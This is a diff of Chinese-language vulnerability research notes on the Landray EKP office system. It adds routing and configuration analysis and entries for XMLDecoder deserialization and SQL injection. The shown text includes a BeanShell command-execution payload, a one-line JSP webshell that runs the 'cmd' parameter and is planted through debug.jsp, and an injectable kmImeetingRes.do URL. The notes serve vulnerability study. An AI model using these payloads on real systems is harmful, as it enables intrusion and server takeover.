@@ -15,17 +15,20 @@
 *   （12）如果想要调试蓝凌EKP的代码，可以在服务器启动时采用命令`.\catalina.bat jpda start`启动服务器，这样默认的监听端口为8000
 
 ## 路由分析
-*   所有jsp或class的访问路径为该文件到ekp目录之前的相对路径，例如`/ekp/sys/common/dataxml.jsp`
-*   所有的配置文件位于`/ekp/WEB-INF/KmssConfig`文件夹下，根据jsp或class对应的文件夹路径，可在KmssConfig下查找该路径下的各类配置内容。
-
+*   （1）路由特点。所有jsp或class的访问路径为该文件到ekp目录之前的相对路径，例如`/ekp/sys/common/dataxml.jsp`
+*   （2）配置文件。位于`/ekp/WEB-INF/KmssConfig`文件夹下，根据jsp或class对应的文件夹路径，可在KmssConfig下查找该路径下的各类配置内容。`spring-mvc.xml`定义了类、访问路径和对应jsp的关系；`spring.xml`中定义了其他的类。所以路径要从`spring-mvc.xml`中查找（有些版本蓝凌用的struts.xml）
+*   （3）可访问的class入口类命名为`xxController`、`xxAction`，都可以在每个目录的`actions`文件夹下查找，例如`/ekp/WEB-INF/classes/com/landray/kmss/common/actions`，入口类对应的访问路径按（2）中的方式查找
+*   （4）请求执行流程。先经过Tomcat的ApplicationFilterChain（包含蓝凌配置的各类Filter、SpringSecurity），然后Spring的DispatcherServlet将请求分发到某个xxActionController，最终执行到其子类的execute方法（如果子类没有execute方法就逐层寻找父类的execute），然后通过dispatchMethod()方法分发到子类的某个具体方法
+*   （5）SpringSecurity配置。`/ekp/WEB-INF/KmssConfig/sys`文件夹下有两个关于SpringSecurity的配置——Authentication（认证）和Authorization（授权）文件夹
 
 ## 已知漏洞
  - [1.custom.jsp文件读取漏洞](#custom文件读取)
  - [2.admin.do jndi漏洞](#jndi攻击admin)
  - [3.BeanShell漏洞](#利用beanshell进行攻击)
  - [4.jsp未授权访问漏洞](#jsp未授权访问)
- - [5.XMLdecode反序列化漏洞](#xmldecode反序列化)
+ - [5.XMLdecoder反序列化漏洞](#xmldecoder反序列化)
  - [6.debug.jsp写文件漏洞](#debug_jsp写文件)
+ - [7.kmImeetingRes.do sql注入漏洞](#sql注入)
 
 ### custom文件读取
 custom.jsp文件内容如下
@@ -205,7 +208,36 @@ Content-Type: application/x-www-form-urlencoded
 s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc.exe");
 ```
 
-### xmldecode反序列化
+### xmldecoder反序列化
+XMLDecoder是**JDK自带**的处理XML文档的类库，将xml格式反序列化为Java对象。与之对应的序列化类为XMLEncoder。XMLDecoder反序列化基础用法如下
+```
+XMLDecoder xmlDecoder = xmlDecoder = new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
+Object o = xmlDecoder.readObject();
+```
+以`/ekp/WEB-INF/KmssConfig/sys/search/spring-mvc.xml`为例，xml内容如下
+```xml
+<bean
+	name="/sys/search/sys_search_main/sysSearchMain.do"
+	class="com.landray.kmss.sys.search.actions.SysSearchMainAction"
+	lazy-init="true"
+	parent="KmssBaseAction">
+	<property
+		name="formType"
+		value="com.landray.kmss.sys.search.forms.SysSearchMainForm" />
+	<property name="forwards">
+		<map>
+			<entry
+				key="view"
+				value="/sys/search/sys_search_main/sysSearchMain_view.jsp" />
+			...
+			<entry
+				key="editParam"
+				value="/sys/search/sys_search_main/sysSearchMain_param.jsp" />
+		</map>
+	</property>
+</bean>
+```
+
 
 ### debug_jsp写文件
 漏洞位于`/ekp/sys/common/debug.jsp`，fdCode传入的内容会直接写入到`<" + "% " + code + " %" + ">";`code的位置，然后将这段jsp代码写入到`/sys/common/code.jsp`中
@@ -223,4 +255,9 @@ s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc.exe");
 Java最简单的一句话木马如下，现在debug.jsp提供了木马两侧的格式`<% code %>`，只需要将木马内容填入，即可将code.jsp变成一个恶意木马
 ```
 <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+```
+
+### sql注入
+```
+/ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true
 ```
